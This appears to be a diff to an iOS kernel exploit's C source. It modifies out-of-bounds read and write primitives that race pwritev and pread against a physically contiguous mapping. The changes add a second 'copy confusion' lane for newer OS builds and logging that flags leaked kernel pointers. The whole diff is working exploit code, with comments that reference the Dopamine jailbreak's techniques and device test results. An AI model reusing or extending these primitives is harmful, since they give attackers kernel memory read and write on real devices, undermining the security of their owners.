@@ -43,13 +43,18 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
 
     // set iov base to physically contiguous addr + 0x3f00
     cs2_ctx.iov.iov_base = (void*)(cs2_ctx.pc_address + 0x3f00);
-    /* OG restore (note-252 + 2026-10-25 reconciliation): the 0x1000
-       single-page iov IS the mechanism — the negative-OOB read of the
-       PRECEDING kernel page, the shape of every on-device PASS (A13 rig x3).
-       The cross-page re-interpretation was the calib's FILE-COPY class = a
-       different mechanism that broke the negative-oob capture. */
-    cs2_ctx.iov.iov_len = offset + size;
-    //    LOG_DEBUG("iov_len %#lx", cs2_ctx.iov.iov_len);
+    /* Two capture lanes (24A435 recovered TAP 2026-11-04):
+         OG / A13 18.x: iov_len = 0x1000, HIT only when pwritev EFAULT (w==-1)
+           then pread. That is Dopamine ClearSword verbatim.
+         27.0 / T8150: pwritev returns the full length (w=4096 on verbatim,
+           w=16384 on calib). LightSword ID-sweep: ok=30720 fail=0, PARTIAL
+           and WRONG live on the SUCCESS copy. Inspect the file whenever
+           copy_confusion_lane is set. iov_len = vm_page_size matches calib.
+       hop-1 cluster_*_contig stays closed (EINVAL since 26.1). */
+    size_t iov_len = (cs2_ctx.copy_confusion_lane && vm_page_size)
+        ? (size_t)vm_page_size
+        : (size_t)(offset + size);
+    cs2_ctx.iov.iov_len = iov_len;
 
     memcpy(buffer, &cs2_ctx.random_marker, sizeof(uint64_t));
     memcpy((void*)(cs2_ctx.pc_address + 0x3f00 + offset), &cs2_ctx.random_marker, sizeof(uint64_t));
@@ -66,9 +71,13 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
         atomic_store_explicit(&cs2_ctx.shared->race_sync, 1, memory_order_seq_cst);
         // trigger bug to read oob_offset oob
         w = pwritev(cs2_ctx.read_fd, &cs2_ctx.iov, 1, 0x3f00);
+        int saved_errno = errno;
         if (try_idx == 0 && first_try_logs++ < 6)
-            LOG("oob try0: w=%zd errno=%d (win-cap=%llu)", w, errno,
-                (unsigned long long)cs2_ctx.highiest_success_idx);
+            LOG("oob try0: w=%zd errno=%d (win-cap=%llu) lane=%s iov=%zx",
+                w, (w == -1) ? saved_errno : 0,
+                (unsigned long long)cs2_ctx.highiest_success_idx,
+                cs2_ctx.copy_confusion_lane ? "copy27" : "efault",
+                iov_len);
         while (atomic_load_explicit(&cs2_ctx.shared->race_sync, memory_order_seq_cst) == 1);
         mach_vm_address_t map_addr = cs2_ctx.pc_address;
         // put physicallly contiguous mapping back
@@ -79,19 +88,31 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
             return KERN_FAILURE;
         }
 
-        if (w == -1) {
-            // LOG_ERR("pwritev failed: %s (errno=%d)\n", strerror(errno), errno);
-            // read size bytes into buffer from read_fd at 0x3f00 + offset
-            // write from file at offset to buffer which will read only oob mem
+        if (w == -1 || (cs2_ctx.copy_confusion_lane && w > 0)) {
             pread(cs2_ctx.read_fd, buffer, size, 0x3f00 + offset);
             uint64_t marker = 0;
             memcpy(&marker, buffer, sizeof(marker));
-            // if marker is not random_marker, we read oob successfully
             if (marker != cs2_ctx.random_marker) {
                 read_race_succeeded = true;
                 cs2_ctx.success_read_count += 1;
                 if (try_idx > cs2_ctx.highiest_success_idx) {
                     cs2_ctx.highiest_success_idx = try_idx;
+                }
+                {
+                    static uint64_t hit_logs = 0;
+                    if (hit_logs++ < 8) {
+                        uint64_t q0 = 0, q1 = 0;
+                        memcpy(&q0, buffer, sizeof(q0));
+                        if (size >= 16) memcpy(&q1, buffer + 8, sizeof(q1));
+                        const char *cls = "other";
+                        if ((q0 >> 36) == 0xfffffff0ull || (q1 >> 36) == 0xfffffff0ull)
+                            cls = "KERNEL POINTER";
+                        else if ((q0 >> 32) == 0xc0dec0deull || (q1 >> 32) == 0xc0dec0deull)
+                            cls = "spray-page tag";
+                        LOG("oob HIT lane=%s w=%zd try=%llu q0=%#llx q1=%#llx (%s)",
+                            w == -1 ? "efault" : "copy27", w,
+                            (unsigned long long)try_idx, q0, q1, cls);
+                    }
                 }
                 break;
             }
@@ -123,7 +144,9 @@ void cs2_oob_write(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t size, ui
     atomic_store_explicit(&cs2_ctx.shared->target_object_offset_sync, mo_offset, memory_order_seq_cst);
 
     cs2_ctx.iov.iov_base = (void*)(cs2_ctx.pc_address + 0x3f00);
-    cs2_ctx.iov.iov_len = offset + size;   /* OG: negative-OOB write window */
+    cs2_ctx.iov.iov_len = (cs2_ctx.copy_confusion_lane && vm_page_size)
+        ? (size_t)vm_page_size
+        : (size_t)(offset + size);
     // read from buffer into fd
     pwrite(cs2_ctx.write_fd, buffer, size, 0x3f00 + offset);
 
